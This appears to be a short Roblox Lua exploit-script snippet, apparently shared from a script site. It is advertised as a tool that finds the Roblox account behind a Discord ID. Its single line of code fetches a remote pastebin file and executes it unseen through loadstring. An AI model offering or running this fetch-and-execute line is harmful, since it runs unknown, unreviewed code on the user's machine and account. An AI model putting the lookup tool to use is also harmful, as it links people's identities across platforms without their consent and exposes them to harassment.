--[[https://robloxscripts.com/discord-id-to-roblox-id-checker-search-up-discord-ids-and-find-their-roblox-account/, discord id to roblox account checker by awdas.
]]
loadstring(game:HttpGet(("https://pastebin.com/raw/6TNuXRc3"),true))()